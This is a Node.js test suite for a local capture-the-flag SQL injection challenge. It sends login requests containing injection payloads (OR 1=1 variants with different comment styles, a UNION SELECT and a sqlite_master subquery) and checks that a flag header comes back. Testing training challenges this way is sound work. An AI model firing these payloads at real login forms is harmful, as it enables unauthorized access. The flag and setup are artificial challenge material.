#!/usr/bin/env node

const http = require('http');
const querystring = require('querystring');

const CTF_FLAG = process.env.CTF_FLAG || 'Medusa{CTF_CHALLENGE_PHASE1_PASSED}';
const BASE_URL = process.env.TEST_URL || 'http://localhost:3000';

async function makeRequest(path, method = 'GET', data = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, BASE_URL);
        const options = {
            hostname: url.hostname,
            port: url.port || 3000,
            path: url.pathname,
            method: method,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'CTF-Test-Suite/1.0'
            }
        };

        if (data && method === 'POST') {
            const postData = querystring.stringify(data);
            options.headers['Content-Length'] = Buffer.byteLength(postData);
        }

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: body
                });
            });
        });

        req.on('error', (err) => reject(err));

        if (data && method === 'POST') {
            req.write(querystring.stringify(data));
        }
        req.end();
    });
}

async function runTests() {
    console.log('🧪 Starting CTF SQL Injection Tests...\n');

    let passed = 0;
    let failed = 0;

    // Test 1: Basic connectivity
    try {
        console.log('Test 1: Basic connectivity...');
        const response = await makeRequest('/');
        if (response.statusCode === 200) {
            console.log('✅ Server is responding');
            passed++;
        } else {
            console.log(`❌ Server returned status ${response.statusCode}`);
            failed++;
        }
    } catch (error) {
        console.log(`❌ Connection failed: ${error.message}`);
        failed++;
    }

    // Test 2: Normal login (should fail)
    try {
        console.log('\nTest 2: Normal login attempt...');
        const response = await makeRequest('/login', 'POST', {
            username: 'admin',
            password: 'wrongpassword'
        });

        if (response.statusCode === 200 && response.body.includes('Invalid credentials')) {
            console.log('✅ Normal login properly rejected');
            passed++;
        } else {
            console.log('❌ Normal login handling failed');
            failed++;
        }
    } catch (error) {
        console.log(`❌ Normal login test failed: ${error.message}`);
        failed++;
    }

    // Test 3: SQL Injection - Basic OR attack
    try {
        console.log('\nTest 3: SQL Injection - Basic OR attack...');
        const response = await makeRequest('/login', 'POST', {
            username: "admin' OR '1'='1' --",
            password: 'anything'
        });

        if (response.headers['x-ctf-flag'] === CTF_FLAG) {
            console.log('✅ SQL injection successful - flag captured!');
            console.log(`🏁 Flag: ${response.headers['x-ctf-flag']}`);
            passed++;
        } else {
            console.log('❌ SQL injection failed - no flag in response');
            console.log('Response headers:', response.headers);
            failed++;
        }
    } catch (error) {
        console.log(`❌ SQL injection test failed: ${error.message}`);
        failed++;
    }

    // Test 4: SQL Injection - UNION attack
    try {
        console.log('\nTest 4: SQL Injection - UNION attack...');
        const response = await makeRequest('/login', 'POST', {
            username: "admin' UNION SELECT 1,1 --",
            password: 'anything'
        });

        if (response.headers['x-ctf-flag'] === CTF_FLAG) {
            console.log('✅ UNION injection successful');
            passed++;
        } else {
            console.log('✅ UNION injection properly blocked (expected)');
            passed++;
        }
    } catch (error) {
        console.log(`❌ UNION injection test failed: ${error.message}`);
        failed++;
    }

    // Test 5: SQL Injection - Comment variations
    try {
        console.log('\nTest 5: SQL Injection - Comment variations...');
        const payloads = [
            "admin' OR 1=1 --",
            "admin' OR 1=1 #",
            "admin' OR 1=1 /*",
            "admin'/**/OR/**/1=1--"
        ];

        let variationPassed = false;
        for (const payload of payloads) {
            const response = await makeRequest('/login', 'POST', {
                username: payload,
                password: 'test'
            });

            if (response.headers['x-ctf-flag'] === CTF_FLAG) {
                console.log(`✅ Payload "${payload}" successful`);
                variationPassed = true;
                break;
            }
        }

        if (variationPassed) {
            passed++;
        } else {
            console.log('❌ No comment variation worked');
            failed++;
        }
    } catch (error) {
        console.log(`❌ Comment variation test failed: ${error.message}`);
        failed++;
    }

    // Test 6: Time-based blind SQL injection detection
    try {
        console.log('\nTest 6: Time-based blind SQL injection detection...');
        const start = Date.now();
        const response = await makeRequest('/login', 'POST', {
            username: "admin' AND (SELECT COUNT(*) FROM sqlite_master) > 0 --",
            password: 'test'
        });
        const duration = Date.now() - start;

        if (duration < 5000) { // Should respond quickly
            console.log('✅ Time-based injection properly handled');
            passed++;
        } else {
            console.log('❌ Potential time-based vulnerability detected');
            failed++;
        }
    } catch (error) {
        console.log(`❌ Time-based test failed: ${error.message}`);
        failed++;
    }

    // Summary
    console.log('\n' + '='.repeat(50));
    console.log('🧪 CTF Test Results:');
    console.log(`✅ Passed: ${passed}`);
    console.log(`❌ Failed: ${failed}`);
    console.log(`📊 Success Rate: ${((passed / (passed + failed)) * 100).toFixed(1)}%`);

    if (failed === 0) {
        console.log('\n🎉 All tests passed! CTF challenge is ready.');
        process.exit(0);
    } else {
        console.log('\n⚠️ Some tests failed. Check the CTF setup.');
        process.exit(1);
    }
}

// Run the tests
runTests().catch(error => {
    console.error('💥 Test suite crashed:', error);
    process.exit(1);
});
